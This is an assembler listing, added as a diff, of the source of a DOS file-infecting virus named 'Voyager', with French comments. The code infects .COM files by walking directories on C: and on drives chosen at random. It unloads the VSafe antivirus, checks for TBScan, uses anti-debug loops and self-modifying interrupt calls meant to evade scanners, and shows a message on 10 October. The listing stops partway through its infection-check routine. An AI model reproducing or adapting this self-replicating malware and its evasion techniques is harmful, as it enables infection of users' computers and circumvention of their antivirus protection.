@@ -1,0 +1,946 @@
+Turbo Assembler	 Version 3.2	    29/08/98 22:59:33	    Page 1
+D:\VIRUS\VOYC.ASM
+
+
+
+      1				     ;****************************************************************************
+      2				     ; VOYAGER (.COM)
+      3				     ;****************************************************************************
+      4				     ; LAST REVISION: 16/11/97
+      5				     ;****************************************************************************
+      6				     ; Virus COM
+      7				     ; Signature: 56 6F	79 61 67 65 72
+      8				     ; A chaque	appel: Infecte 1 fichier COM par rep au	niveau 2 de c:
+      9				     ;		       Infecte tous les	fichiers COM de	c:\DOS
+     10				     ;		       Infecte 1 fichier COM par rep au	niveau x de y: (sauf si	y=c)
+     11				     ;****************************************************************************
+     12
+     13	0000			     .model tiny
+     14				     ;Surtout ne pas mettre .radix x (x=16,32,...)
+     15	0000			     .code
+     16				     org 100h
+     17				     include d:\sources\asm\macros.inc
+1    18				     SaveRegisters macro
+1    19				     pushf
+1    20				     ;pusha
+1    21				     push    ax
+1    22				     push    bx
+1    23				     push    cx
+1    24				     push    dx
+1    25				     ;----
+1    26				     push    ds
+1    27				     push    es
+1    28				     push    di
+1    29				     push    si
+1    30				     push    bp
+1    31				     endm
+1    32
+1    33				     RestoreRegisters macro
+1    34				     pop     bp
+1    35				     pop     si
+1    36				     pop     di
+1    37				     pop     es
+1    38				     pop     ds
+1    39				     ;popa
+1    40				     pop     dx
+1    41				     pop     cx
+1    42				     pop     bx
+1    43				     pop     ax
+1    44				     ;----
+1    45				     popf
+1    46				     endm
+1    47
+1    48
+1    49				     SaveDTA macro
+1    50				     mov     ah,2Fh
+1    51				     int     21h
+1    52				     push    es
+1    53				     push    bx
+1    54				     endm
+1    55
+1    56				     RestoreDTA	macro
+1    57				     ;Replace DTA dans zone d'origine (normallement 80h	du PSP DX=80h,AH=1Ah)
+Turbo Assembler	 Version 3.2	    29/08/98 22:59:33	    Page 2
+D:\VIRUS\VOYC.ASM
+
+
+
+1    58				     pop     dx
+1    59				     pop     ds
+1    60				     mov     ah,1Ah
+1    61				     int     21h
+1    62				     endm
+1    63
+1    64
+1    65				     SavePSP macro
+1    66				     xor     si,si
+1    67				     mov     di,dx
+1    68				     mov     cx,256
+1    69				     copie_savepsp:
+1    70				     lodsb
+1    71				     stosb
+1    72				     dec     cx
+1    73				     jnz     copie_savepsp
+1    74				     endm
+1    75
+1    76				     RestorePSP	macro
+1    77				     xor     di,di
+1    78				     mov     si,dx
+1    79				     mov     cx,256
+1    80				     copie_restorepsp:
+1    81				     lodsb
+1    82				     stosb
+1    83				     dec     cx
+1    84				     jnz     copie_restorepsp
+1    85				     endm
+1    86
+     87				     include d:\virus\lib.inc
+1    88				     ;***************************************************************
+1    89				     ; Renvoi l'heure (Secondes	en DH, centiŠmes en DL)
+1    90				     ;***************************************************************
+1    91				     Find_time macro
+1    92						     ; Modifie le int
+1    93						     mov     byte ptr cs:[bp+offset repere_int - offset	virus_start],0CDh
+1    94						     call    virus_end ; Force d‚chargement et rechargement du cache code (cr‚e	    +
+     95				     Warning)
+1    96						     ; Test al‚atoire
+1    97						     mov     ah,2Ch    ; Fonction 2Ch: Lire heure
+1    98				     repere_int:     db	     0B2h,21h  ; B221=Mov dl,21h … remplacer par CD21= Int 21h
+1    99						     ; Remodifie le int
+1   100						     mov     byte ptr cs:[bp+offset repere_int - offset	virus_start],0B2h
+1   101						     ; On utilise un des prochains call	pour recharge cache code
+1   102				     endm
+1   103
+1   104
+1   105				     ;***************************************************************
+1   106				     ; Renvoi la date (Mois en DH, jour	en DL)
+1   107				     ;***************************************************************
+1   108				     Find_date macro
+1   109						     ; Modifie le int
+1   110						     mov     byte ptr cs:[bp+offset repere_int2	- offset virus_start],0CDh
+1   111						     call    virus_end ; Force d‚chargement et rechargement du cache code (cr‚e	    +
+    112				     Warning)
+1   113						     ; Test al‚atoire
+1   114						     mov     ah,2Ah    ; Fonction 2Ah: Lire date
+Turbo Assembler	 Version 3.2	    29/08/98 22:59:33	    Page 3
+D:\VIRUS\VOYC.ASM
+
+
+
+1   115				     repere_int2:    db	     0B2h,21h  ; B221=Mov dl,21h … remplacer par CD21= Int 21h
+1   116						     ; Remodifie le int
+1   117						     mov     byte ptr cs:[bp+offset repere_int2	- offset virus_start],0B2h
+1   118						     ; On utilise un des prochains call	pour recharge cache code
+1   119				     endm
+1   120
+1   121
+1   122				     ;*********************************************************************
+1   123				     ; D‚termine disque	valide dans usefile … partir de	valeur de DL (0-31)
+1   124				     ; Retour: Modification de usefile global (	-> 'c:'	ou 'd:'	...)
+1   125				     ;*********************************************************************
+1   126				     Wich_disk macro
+1   127						     and     dl,1Fh	 ; Prend zone valeur al‚atoire de 0 … 31
+1   128						     mov     bx,0005h	 ; Met bh … 0 et bl … 5
+1   129				     boucle_test:    dec     bl
+1   130						     shr     dl,1
+1   131						     jnz     short boucle_test ; Saut si dl pas	encore nul
+1   132						     add     bl,3
+1   133				     test_drive:     mov     ax,4408h
+1   134						     int     21h
+1   135						     jc	     short drive_error ; Saut si erreur	fonction
+1   136						     cmp     ax,1h
+1   137						     jz	     short drive_ok    ; Saut si drive_ok (amovible)
+1   138				     drive_error:    cmp     bl,3h
+1   139						     jbe     drive_ok	       ; Saut si drive <= 'c:'
+1   140						     dec     bl
+1   141						     jmp     short test_drive
+1   142				     drive_ok:	     add     bx,3A60h	 ; Met 'x:' dans bx (x forc‚ment valide)
+1   143						     ; Usefile='x:'
+1   144						     mov     word ptr cs:[bp+offset usefile-offset virus_start],bx
+1   145						     mov     byte ptr cs:[bp+offset usefile-offset virus_start+2],00h
+1   146				     endm
+1   147
+1   148
+1   149				     ;***************************************************************
+1   150				     ; Teste si	sytŠme prot‚g‚ par un controlleur int‚grit‚
+1   151				     ; Renvoi z=0:Non, z=1:Oui
+1   152				     ;***************************************************************
+1   153				     Antivirus_test macro
+1   154						     ; Remove Vsafe from memory
+1   155						     ; Modifie le int
+1   156						     mov     ax,0FA01h ; Function FAh, subfunction 1
+1   157						     mov     byte ptr cs:[bp+offset repere_int3	- offset virus_start],0CDh
+1   158						     mov     dx,5945h
+1   159						     push    ax
+1   160						     call    virus_end ; Force d‚chargement et rechargement du cache code (cr‚e	    +
+    161				     Warning)
+1   162						     pop     ax
+1   163				     repere_int3:    db	     0B2h,21h  ; B221=Mov dl,21h … remplacer par CD21= Int 21h
+1   164						     ; Remodifie le int
+1   165						     mov     byte ptr cs:[bp+offset repere_int3	- offset virus_start],0B2h
+1   166						     ; On utilise un des prochains call	pour recharge cache code
+1   167						     ; TBScanx pr‚sent ?
+1   168						     mov     ax,0CA00h
+1   169						     mov     bx,'TB'
+1   170						     int     2Fh
+1   171						     cmp     bx,'tb'
+Turbo Assembler	 Version 3.2	    29/08/98 22:59:33	    Page 4
+D:\VIRUS\VOYC.ASM
+
+
+
+1   172				     fin:	     ; z=0:No integrity	checker	found, z=1:Integrity Checker found
+1   173				     endm
+1   174
+1   175
+1   176				     ;***************************************************************
+1   177				     ; Boucle inutile utilis‚e contre debuger Antivirus
+1   178				     ;***************************************************************
+1   179				     Boucle_antidebug macro
+1   180						     mov     cx,0FFFFh
+1   181				     boucle:	     dec     cx
+1   182						     jnz     boucle
+1   183				     endm
+    184
+    185				     ;****************************************************************************
+    186				     ; Programme d'accueil
+    187				     ; Cette zone de saut sera remplac‚e en m‚moire, aprŠs ex‚cution du	virus par
+    188				     ; le code originel	stock‚ en code_image.
+    189				     ;****************************************************************************
+    190	0100  E9 02 00		     host:	     db	     0E9h,02h,00h	  ; Jmp	au code	du virus (virus_start)
+    191	0103  21				     db	     '!'		  ; Identifiant	de la maladie.
+    192						     ;	     ...		  ; Zone du programme non catamin‚e
+    193	0104  C3				     ret			  ;
+    194				     ;****************************************************************************
+    195				     ; Programme principal du virus (D‚but du virus)
+    196				     ;****************************************************************************
+    197	0105			     virus_start:    ;Save registers
+    198						     SaveRegisters
+1   199	0105  9C		     pushf
+1   200	0106  50		     push    ax
+1   201	0107  53		     push    bx
+1   202	0108  51		     push    cx
+1   203	0109  52		     push    dx
+1   204	010A  1E		     push    ds
+1   205	010B  06		     push    es
+1   206	010C  57		     push    di
+1   207	010D  56		     push    si
+1   208	010E  55		     push    bp
+    209						     ;Save DTA
+    210						     SaveDTA
+1   211	010F  B4 2F		     mov     ah,2Fh
+1   212	0111  CD 21		     int     21h
+1   213	0113  06		     push    es
+1   214	0114  53		     push    bx
+    215						     ;DS=CS, ES=CS
+    216	0115  0E				     push    cs
+    217	0116  1F				     pop     ds
+    218	0117  0E				     push    cs
+    219	0118  07				     pop     es
+    220						     ;Boucle contre debugage du	point d'entr‚e
+    221						     Boucle_antidebug
+1   222	0119  B9 FFFF				     mov     cx,0FFFFh
+1   223	011C  49		     boucle:	     dec     cx
+1   224	011D  75 FD				     jnz     boucle
+    225						     ;Place offset de virus_start en BP
+    226	011F  E8 0000				     call    get_start	;This is a near	call (Push only	IP)
+    227	0122  5D		     get_start:	     pop     bp
+    228	0123  83 ED 1D				     sub     bp,offset get_start - offset virus_start
+Turbo Assembler	 Version 3.2	    29/08/98 22:59:33	    Page 5
+D:\VIRUS\VOYC.ASM
+
+
+
+    229						     ;Teste si systŠme prot‚g‚ par controlleur d'int‚grit‚
+    230						     Antivirus_test ; z=0:Non, z=1:Oui
+1   231	0126  B8 FA01				     mov     ax,0FA01h ; Function FAh, subfunction 1
+1   232	0129  2E: C6 46	31 CD			     mov     byte ptr cs:[bp+offset repere_int3	- offset virus_start],0CDh
+1   233	012E  BA 5945				     mov     dx,5945h
+1   234	0131  50				     push    ax
+1   235	0132  E8 00E4				     call    virus_end ; Force d‚chargement et rechargement du cache code (cr‚e	    +
+    236				     Warning)
+1   237	0135  58				     pop     ax
+1   238	0136  B2 21		     repere_int3:    db	     0B2h,21h  ; B221=Mov dl,21h … remplacer par CD21= Int 21h
+1   239	0138  2E: C6 46	31 B2			     mov     byte ptr cs:[bp+offset repere_int3	- offset virus_start],0B2h
+1   240	013D  B8 CA00				     mov     ax,0CA00h
+1   241	0140  BB 5442				     mov     bx,'TB'
+1   242	0143  CD 2F				     int     2Fh
+1   243	0145  81 FB 7462			     cmp     bx,'tb'
+1   244	0149			     fin:	     ; z=0:No integrity	checker	found, z=1:Integrity Checker found
+    245	0149  75 03				     jnz     go_on
+    246	014B  E9 0099				     jmp     back_to_host
+    247	014E			     go_on:	     ;Met … 0 le compteur d'infection
+    248				     ;		      mov     byte ptr cs:[bp+offset count-offset virus_start],00h
+    249						     ;Attaque les fichiers de niveau 2:	c:\*.*\*.com
+    250	014E  2E: C7 86	0442 3A63		     mov     word ptr cs:[bp+offset usefile-offset virus_start],':c'
+    251	0155  2E: C6 86	0444 00			     mov     byte ptr cs:[bp+offset usefile-offset virus_start+2],00h
+    252	015B  E8 0121				     call    scan_rep2
+    253						     ;Recherche	valeur al‚atoire (0-60 en DH, 0-100 en DL)
+    254						     Find_time
+1   255	015E  2E: C6 46	63 CD			     mov     byte ptr cs:[bp+offset repere_int - offset	virus_start],0CDh
+1   256	0163  E8 00B3				     call    virus_end ; Force d‚chargement et rechargement du cache code (cr‚e	    +
+    257				     Warning)
+1   258	0166  B4 2C				     mov     ah,2Ch    ; Fonction 2Ch: Lire heure
+1   259	0168  B2 21		     repere_int:     db	     0B2h,21h  ; B221=Mov dl,21h … remplacer par CD21= Int 21h
+1   260	016A  2E: C6 46	63 B2			     mov     byte ptr cs:[bp+offset repere_int - offset	virus_start],0B2h
+    261						     ;Sauvegarde valeur	al‚atoire
+    262	016F  52				     push    dx
+    263						     ;D‚termine	le disque cible	… partir de DL (0-31) dans usefile
+    264						     Wich_disk
+1   265	0170  80 E2 1F				     and     dl,1Fh	 ; Prend zone valeur al‚atoire de 0 … 31
+1   266	0173  BB 0005				     mov     bx,0005h	 ; Met bh … 0 et bl … 5
+1   267	0176  FE CB		     boucle_test:    dec     bl
+1   268	0178  D0 EA				     shr     dl,1
+1   269	017A  75 FA				     jnz     short boucle_test ; Saut si dl pas	encore nul
+1   270	017C  80 C3 03				     add     bl,3
+1   271	017F  B8 4408		     test_drive:     mov     ax,4408h
+1   272	0182  CD 21				     int     21h
+1   273	0184  72 05				     jc	     short drive_error ; Saut si erreur	fonction
+1   274	0186  3D 0001				     cmp     ax,1h
+1   275	0189  74 09				     jz	     short drive_ok    ; Saut si drive_ok (amovible)
+1   276	018B  80 FB 03		     drive_error:    cmp     bl,3h
+1   277	018E  76 04				     jbe     drive_ok	       ; Saut si drive <= 'c:'
+1   278	0190  FE CB				     dec     bl
+1   279	0192  EB EB				     jmp     short test_drive
+1   280	0194  81 C3 3A60	     drive_ok:	     add     bx,3A60h	 ; Met 'x:' dans bx (x forc‚ment valide)
+1   281	0198  2E: 89 9E	0442			     mov     word ptr cs:[bp+offset usefile-offset virus_start],bx
+1   282	019D  2E: C6 86	0444 00			     mov     byte ptr cs:[bp+offset usefile-offset virus_start+2],00h
+    283						     ;R‚cupŠre valeur al‚atoire
+    284	01A3  5A				     pop     dx
+    285						     ;Infection	de niveau 1, 2 ou 3 selon DL sur disque	al‚atoire
+Turbo Assembler	 Version 3.2	    29/08/98 22:59:33	    Page 6
+D:\VIRUS\VOYC.ASM
+
+
+
+    286						     ; 0-40:3 40-80:2 80-100:1
+    287	01A4  80 FA 28		     niveau3:	     cmp     dl,40
+    288	01A7  73 05				     jae     niveau2
+    289	01A9  E8 006E				     call    scan_rep3
+    290	01AC  EB 16				     jmp     short action
+    291	01AE  80 FA 50		     niveau2:	     cmp     dl,80
+    292	01B1  73 0E				     jae     niveau1
+    293	01B3  B0 63				     mov     al,'c' ;Si	encore disque c, n'attaque pas
+    294	01B5  2E: 3A 86	0442			     cmp     al,byte ptr cs:[bp+offset usefile-offset virus_start]
+    295	01BA  74 08				     je	     short action
+    296	01BC  E8 00C0				     call    scan_rep2
+    297	01BF  EB 03				     jmp     short action
+    298	01C1  E8 0128		     niveau1:	     call    scan_rep1
+    299	01C4			     action:	     ;Recherche	jour (Jour et mois en DH DL)
+    300						     Find_date
+1   301	01C4  2E: C6 86	00CA CD			     mov     byte ptr cs:[bp+offset repere_int2	- offset virus_start],0CDh
+1   302	01CA  E8 004C				     call    virus_end ; Force d‚chargement et rechargement du cache code (cr‚e	    +
+    303				     Warning)
+1   304	01CD  B4 2A				     mov     ah,2Ah    ; Fonction 2Ah: Lire date
+1   305	01CF  B2 21		     repere_int2:    db	     0B2h,21h  ; B221=Mov dl,21h … remplacer par CD21= Int 21h
+1   306	01D1  2E: C6 86	00CA B2			     mov     byte ptr cs:[bp+offset repere_int2	- offset virus_start],0B2h
+    307						     ;Teste si 10 octobre
+    308	01D7  81 FA 0A0A			     cmp     dx,0A0Ah
+    309	01DB  75 0A				     jnz     short back_to_host	; Saut si <>
+    310						     ;Se reveille (Affiche message)
+    311	01DD  8B D5				     mov     dx,bp
+    312	01DF  81 C2 04A0			     add     dx,offset message-offset virus_start
+    313	01E3  B4 09				     mov     ah,09h
+    314	01E5  CD 21				     int     21h
+    315	01E7			     back_to_host:   ;Replace l'ancien code stock‚ dans	code_image en host:
+    316	01E7  2E: 8B 86	03B4			     mov     ax,word ptr cs:[bp+offset code_image-offset virus_start]
+    317	01EC  2E: 8B 8E	03B6			     mov     cx,word ptr cs:[bp+offset code_image-offset virus_start+2]
+    318	01F1  BB 0100r				     mov     bx,offset host ;M‚thode indirecte pour ‚viter Heuristic
+    319	01F4  2E: 89 07				     mov     word ptr cs:[bx],ax
+    320	01F7  2E: 89 4F	02			     mov     word ptr cs:[bx+2],cx
+    321						     ;Restore DTA
+    322						     RestoreDTA
+1   323	01FB  5A		     pop     dx
+1   324	01FC  1F		     pop     ds
+1   325	01FD  B4 1A		     mov     ah,1Ah
+1   326	01FF  CD 21		     int     21h
+    327						     ;Restitue ‚tat des	registres
+    328						     RestoreRegisters
+1   329	0201  5D		     pop     bp
+1   330	0202  5E		     pop     si
+1   331	0203  5F		     pop     di
+1   332	0204  07		     pop     es
+1   333	0205  1F		     pop     ds
+1   334	0206  5A		     pop     dx
+1   335	0207  59		     pop     cx
+1   336	0208  5B		     pop     bx
+1   337	0209  58		     pop     ax
+1   338	020A  9D		     popf
+    339						     ;Place retour … l'hote
+    340						     ;Push 100h
+    341	020B  FA				     cli
+    342	020C  50				     push    ax
+Turbo Assembler	 Version 3.2	    29/08/98 22:59:33	    Page 7
+D:\VIRUS\VOYC.ASM
+
+
+
+    343	020D  55				     push    bp
+    344	020E  8B EC				     mov     bp,sp
+    345	0210  C7 46 02 0100			     mov     word ptr ss:[bp+02],100h
+    346	0215  5D				     pop     bp
+    347	0216  FB				     sti
+    348						     ;End push 100h
+    349	0217  EB 00				     jmp     short virus_end ; Jmp pour	‚viter d‚tection par F-prot
+    350	0219  C3		     virus_end:	     ret     ; Retour (Si 100h dans la pile puis IP, retour … l'hote)
+    351
+    352
+    353
+    354				     ;****************************************************************************
+    355				     ; Fonction	qui recherche des sous-r‚pertoires dans	r‚pertoire en usefile
+    356				     ; Pour chaque sous-r‚pertoire trouv‚, elle	appelle	scan_rep2
+    357				     ;****************************************************************************
+    358	021A			     scan_rep3:	     ;Recherche	de r‚pertoires
+    359	021A  B4 1A				     mov     ah,1Ah	     ; Place DTA en dta3
+    360	021C  8B D5				     mov     dx,bp
+    361	021E  81 C2 040E			     add     dx,offset dta3-offset virus_start
+    362	0222  CD 21				     int     21h
+    363						     ;G‚n‚ration de chaine de recherche	des r‚pertoires	dans usefile
+    364	0224  8B FD				     mov     di,bp
+    365	0226  81 C7 0442			     add     di,offset usefile-offset virus_start
+    366	022A  8B F5				     mov     si,bp
+    367	022C  81 C6 0494			     add     si,offset dirtofind - offset virus_start
+    368	0230  E8 011F				     call    concat
+    369	0233  47				     inc     di	;
+    370						     ;Recherche	First (AH=4Eh,CL=Attrib,DX=chaine)
+    371	0234  B9 4E00				     mov     cx,4E00h
+    372	0237  91				     xchg    ax,cx
+    373	0238  B1 37				     mov     cl,37h	     ; Recherche attributs ADRSH mais pas V
+    374	023A  8B D5				     mov     dx,bp
+    375	023C  81 C2 0442			     add     dx,offset usefile-offset virus_start
+    376	0240  CD 21				     int     21h
+    377	0242  0A C0				     or	     al,al
+    378	0244  75 38				     jnz     short exit_scan_rep3	; Saut si pas de r‚pertoires
+    379	0246  EB 12				     jmp     short xxx_found3
+    380	0248			     find_nextrep3:  ;Recherche	r‚pertoire suivant
+    381	0248  B4 1A				     mov     ah,1Ah	     ; Place DTA en dta3
+    382	024A  8B D5				     mov     dx,bp
+    383	024C  81 C2 040E			     add     dx,offset dta3-offset virus_start
+    384	0250  CD 21				     int     21h
+    385						     ;Recherche	Next
+    386	0252  B4 4F				     mov     ah,4Fh
+    387	0254  CD 21				     int     21h
+    388	0256  0A C0				     or	     al,al
+    389	0258  75 24				     jnz     short exit_scan_rep3	; Saut si plus de r‚pertoires
+    390	025A  2E: F6 86	0423 10	     xxx_found3:     test    byte ptr cs:[bp+offset dta3-offset	virus_start+15h],10h	; Test	    +
+    391				     attributs par AND 10h
+    392	0260  74 E6				     jz	     short find_nextrep3	; Saut si ce n'est pas rep
+    393						     ;Evite r‚pertoire wi*.* (x:\windows)
+    394	0262  2E: 81 BE	042C 4957		     cmp     word ptr cs:[bp+offset fname3-offset virus_start],'IW'	; Refuse    +
+    395				     r‚pertoire	command
+    396	0269  74 DD				     jz	     short find_nextrep3
+    397						     ;Inutile de tester	.
+    398	026B			     rep_found3:     ;On reconstruit solution dans usefile
+    399	026B  C6 05 00				     mov     byte ptr [di],0		; Retrouve r‚pertoire
+Turbo Assembler	 Version 3.2	    29/08/98 22:59:33	    Page 8
+D:\VIRUS\VOYC.ASM
+
+
+
+    400	026E  8B F5				     mov     si,bp
+    401	0270  81 C6 042C			     add     si,offset fname3-offset virus_start	   ; Nom du r‚pertoire
+    402	0274  E8 00DB				     call    concat
+    403	0277			     search_file3:   ;Appelle de scanexe: Usefile contient rep … scanner termin‚e par 0
+    404	0277  57				     push    di
+    405	0278  E8 0004				     call    scan_rep2 ; Cherche et attaque (modifie DI	et BX)
+    406	027B  5F				     pop     di
+    407	027C  EB CA				     jmp     short find_nextrep3  ; Recommence pour rep	suivant
+    408	027E  C3		     exit_scan_rep3: ret
+    409				     ;****************************************************************************
+    410				     ; Fonction	qui recherche des sous-r‚pertoires dans	r‚pertoire en usefile
+    411				     ; Pour chaque sous-r‚pertoire trouv‚, elle	appelle	findexe	et lance infect
+    412				     ;****************************************************************************
+    413	027F			     scan_rep2:	     ;Recherche	de r‚pertoires
+    414	027F  B4 1A				     mov     ah,1Ah	     ; Place DTA en dta2
+    415	0281  8B D5				     mov     dx,bp
+    416	0283  81 C2 03E3			     add     dx,offset dta2-offset virus_start
+    417	0287  CD 21				     int     21h
+    418						     ;G‚n‚ration de chaine de recherche	des r‚pertoires	dans usefile
+    419	0289  8B FD				     mov     di,bp
+    420	028B  81 C7 0442			     add     di,offset usefile-offset virus_start
+    421	028F  8B F5				     mov     si,bp
+    422	0291  81 C6 0494			     add     si,offset dirtofind-offset	virus_start
+    423	0295  E8 00BA				     call    concat
+    424	0298  47				     inc     di
+    425						     ;Recherche	First (AH=4Eh,CL=Attrib,DX=chaine)
+    426	0299  B9 4E00				     mov     cx,4E00h
+    427	029C  91				     xchg    ax,cx
+    428	029D  B1 37				     mov     cl,37h	     ; Recherche attributs ADRSH mais pas V
+    429	029F  8B D5				     mov     dx,bp
+    430	02A1  81 C2 0442			     add     dx,offset usefile-offset virus_start
+    431	02A5  CD 21				     int     21h
+    432	02A7  0A C0				     or	     al,al
+    433	02A9  75 40				     jnz     short exit_scan_rep2	; Saut si pas de r‚pertoires
+    434	02AB  EB 12				     jmp     short xxx_found2
+    435	02AD			     find_nextrep2:  ;Recherche	r‚pertoire suivant
+    436	02AD  B4 1A				     mov     ah,1Ah	     ; Place DTA en dta2
+    437	02AF  8B D5				     mov     dx,bp
+    438	02B1  81 C2 03E3			     add     dx,offset dta2-offset virus_start
+    439	02B5  CD 21				     int     21h
+    440						     ;Recherche	Next
+    441	02B7  B4 4F				     mov     ah,4Fh
+    442	02B9  CD 21				     int     21h
+    443	02BB  0A C0				     or	     al,al
+    444	02BD  75 2C				     jnz     short exit_scan_rep2	; Saut si plus de r‚pertoires
+    445	02BF  2E: F6 86	03F8 10	     xxx_found2:     test    byte ptr cs:[bp+offset dta2-offset	virus_start+15h],10h	; Test	    +
+    446				     attributs par AND 10h
+    447	02C5  74 E6				     jz	     short find_nextrep2
+    448						     ;Evite r‚pertoire co*.* (x:\windows\command)
+    449	02C7  2E: 81 BE	0401 4F43		     cmp     word ptr cs:[bp+offset fname2-offset virus_start],'OC'	; Refuse    +
+    450				     r‚pertoire	command
+    451	02CE  74 DD				     jz	     short find_nextrep2
+    452	02D0  2E: 80 BE	0401 2E			     cmp     byte ptr cs:[bp+offset fname2-offset virus_start],'.'     ; Refuse	    +
+    453				     r‚pertoire	..
+    454	02D6  74 D5				     jz	     short find_nextrep2
+    455	02D8			     rep_found2:     ;On reconstruit solution dans usefile
+    456	02D8  C6 05 00				     mov     byte ptr [di],0		; Retrouve r‚pertoire
+Turbo Assembler	 Version 3.2	    29/08/98 22:59:33	    Page 9
+D:\VIRUS\VOYC.ASM
+
+
+
+    457	02DB  8B F5				     mov     si,bp
+    458	02DD  81 C6 0401			     add     si,offset fname2-offset virus_start	   ; Nom du r‚pertoire
+    459	02E1  E8 006E				     call    concat
+    460	02E4			     search_file:    ;Appelle de scan_rep1: Usefile contient rep … scanner termin‚e par	0
+    461	02E4  57				     push    di
+    462	02E5  E8 0004				     call    scan_rep1 ; Cherche et attaque (modifie DI	et BX)
+    463	02E8  5F				     pop     di
+    464	02E9  EB C2				     jmp     short find_nextrep2  ; Recommence pour rep	suivant
+    465	02EB  C3		     exit_scan_rep2: ret
+    466				     ;****************************************************************************
+    467				     ; Fonction	qui recherche un ex‚cutable valide au niveau du	r‚pertoire en
+    468				     ; usefile et l'infecte si trouv‚.
+    469				     ;****************************************************************************
+    470	02EC			     scan_rep1:	     ;Place le DTA en dta1 (dans la zone de donn‚es du virus)
+    471	02EC  B4 1A				     mov     ah,1Ah		  ; Place DTA en dta1
+    472	02EE  8B D5				     mov     dx,bp
+    473	02F0  81 C2 03B8			     add     dx,offset dta1-offset virus_start
+    474	02F4  CD 21				     int     21h
+    475						     ;G‚n‚ration de chaine de recherche	des fichiers dans usefile
+    476	02F6  8B FD				     mov     di,bp
+    477	02F8  81 C7 0442			     add     di,offset usefile-offset virus_start
+    478	02FC  8B F5				     mov     si,bp
+    479	02FE  81 C6 0499			     add     si,offset filetofind - offset virus_start
+    480	0302  E8 004D				     call    concat
+    481	0305  47				     inc     di			  ; On place DI	aprŠs le '\'
+    482	0306  C6 45 02 63			     mov     byte ptr [di+2],'c'  ; Transforme *.vom en	*.com
+    483						     ;Recherche	First (AH=4Eh)
+    484	030A  B9 4E00				     mov     cx,4E00h
+    485	030D  91				     xchg    ax,cx
+    486	030E  B1 27				     mov     cl,27h		  ; Attributs ARSH mais	pas V ni D
+    487	0310  8B D5				     mov     dx,bp
+    488	0312  81 C2 0442			     add     dx,offset usefile-offset virus_start
+    489	0316  CD 21				     int     21h
+    490	0318  0A C0				     or	     al,al
+    491	031A  75 35				     jnz     short exit_scan_rep1 ; Saut si pas	de fichiers trouv‚s
+    492						     ;On reconstruit solution dans usefile
+    493	031C  C6 05 00				     mov     byte ptr [di],0
+    494	031F  8B F5				     mov     si,bp
+    495	0321  81 C6 03D6			     add     si,offset fname1-offset virus_start ; Nom du fichier
+    496	0325  E8 002A				     call    concat		  ; DI n'a pas boug‚
+    497						     ;Teste validit‚ du	fichier	trouv‚ et infecte
+    498	0328  E8 003A				     call    file_ok		  ; Retour c=0:invalide	ou c=1:infect‚
+    499	032B  73 02				     jnc     short find_nextrep1  ; Saut si non	valide
+    500	032D  EB 19				     jmp     short again
+    501	032F			     find_nextrep1:  ;Recherche	Next
+    502	032F  B4 4F				     mov     ah,4Fh
+    503	0331  CD 21				     int     21h
+    504	0333  0A C0				     or	     al,al
+    505	0335  75 1A				     jnz     short exit_scan_rep1 ; Saut si plus de fichiers
+    506						     ;On reconstruit solution dans usefile
+    507	0337  C6 05 00				     mov     byte ptr [di],0
+    508	033A  8B F5				     mov     si,bp
+    509	033C  81 C6 03D6			     add     si,offset fname1-offset virus_start ; Nom du fichier
+    510	0340  E8 000F				     call    concat		; DI n'a pas boug‚
+    511						     ;Teste validit‚ du	fichier	trouv‚ et infecte
+    512	0343  E8 001F				     call    file_ok ; Retour c=0:invalide ou c=1:infect‚
+    513	0346  73 E7				     jnc     short find_nextrep1 ; Saut	si non valide
+Turbo Assembler	 Version 3.2	    29/08/98 22:59:33	    Page 10
+D:\VIRUS\VOYC.ASM
+
+
+
+    514	0348  2E: 81 BE	0445 4F44    again:	     cmp     word ptr cs:[bp+offset usefile-offset virus_start+3],'OD'
+    515	034F  74 DE				     jz	     short find_nextrep1 ; Si rep x:\do*.*, on recommence
+    516	0351  C3		     exit_scan_rep1: ret
+    517				     ;****************************************************************************
+    518				     ; Fonction	qui concataine une chaine en es:di (premier car.) suivi	d'une
+    519				     ; chaine commen‡ant en ds:si (premier car.)
+    520				     ; En sortie, es:di	pointe sur le premier car. … droite de la jonction
+    521				     ;		  ds:si	pointe le 0 de la chaine destination
+    522				     ;****************************************************************************
+    523	0352			     concat:	     ;Place DI sur le 0	de chaine source
+    524	0352  26: 8A 05				     mov     al,byte ptr es:[di]
+    525	0355  47				     inc     di
+    526	0356  0A C0				     or	     al,al
+    527	0358  75 F8				     jnz     short concat  ; Boucle jusqu'… fin	chaine1
+    528	035A  4F				     dec     di	     ; DI pointe le 0
+    529	035B  57				     push    di	     ; Sauve DI	(N‚cessaire ?)
+    530	035C			     concat2:	     ;Fusionne
+    531	035C  FC				     cld     ; Clear Flag D: SI	et DI sont incr‚ment‚s
+    532	035D  AC				     lodsb   ; Place ‚l‚ment en	DS:SI dans AX (SI incr‚ment‚)
+    533	035E  AA				     stosb   ; Place ‚l‚ment dans AX en	ES:DI (DI incr‚ment‚)
+    534	035F  0A C0				     or	     al,al
+    535	0361  75 F9				     jnz     short concat2 ; Boucle jusqu'… fin	chaine2
+    536	0363  5F				     pop     di		   ; R‚cupŠre DI (N‚cessaire ?)
+    537	0364  C3		     exit_concat:    ret
+    538				     ;****************************************************************************
+    539				     ; Fonction	qui d‚termine si un fichier peut ˆtre infect‚
+    540				     ; Entr‚e: Le chemin complet du fichier dans usefile et ses	info dans dta1
+    541				     ; BX sert de handler au fichier cible ouvert tout au long de la fonction
+    542				     ; Retourne	c=0: invalide ou c=1: infect‚
+    543				     ;****************************************************************************
+    544	0365  2E: 81 BE	03D6 4F43    file_ok:	     cmp     word ptr cs:[bp+offset fname1-offset virus_start],'OC'  ; Refuse	    +
+    545				     fichier command.com
+    546	036C  74 50				     jz	     fok_erreur	; Evite	fichier	command.com
+    547	036E  2E: 81 BE	03D6 4957		     cmp     word ptr cs:[bp+offset fname1-offset virus_start],'IW'  ; Refuse	    +
+    548				     fichier win.com
+    549	0375  74 47				     jz	     fok_erreur	; Evite	fichier	win.com
+    550	0377  E8 00C6				     call    open_save_attribute  ; Sauve attributs et ouvre
+    551	037A  73 42				     jnc     short fok_erreur	  ; Saut si erreur … l'ouverture
+    552						     ;Lit les 4	premiers octets	du fichier en les pla‡ant dans start_image
+    553	037C  B4 3F				     mov     ah,3Fh
+    554	037E  B9 0004				     mov     cx,4
+    555	0381  8B D5				     mov     dx,bp
+    556	0383  81 C2 0490			     add     dx,offset start_image-offset virus_start
+    557	0387  CD 21				     int     21h
+    558						     ;Determine	taille du fichier + virus + pile de 100	octets
+    559	0389  2E: 8B 86	03D2			     mov     ax,word ptr cs:[bp+offset fsize1-offset virus_start]
